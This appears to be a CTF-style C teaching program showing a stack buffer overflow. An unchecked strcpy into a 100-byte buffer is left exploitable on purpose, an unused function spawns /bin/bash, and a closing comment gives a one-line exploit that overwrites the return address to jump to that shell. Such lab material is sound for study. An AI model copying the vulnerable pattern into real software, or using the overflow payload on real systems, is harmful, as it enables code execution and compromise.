#include <stdio.h>
#include <string.h>

void not_called(){
    printf("Enjoy your shell!\n");
    system("/bin/bash");
}

void vulnerable_function(char* string){
    char buffer[100];
    strcpy(buffer, string);
}

int main(int argc, char** argv){
    vulnerable_function(argv[1]);
    return 0;
}
//  exploit ./rop-example "$(python -c 'print "A"*0x78 + "\x76\x11\x40"' )"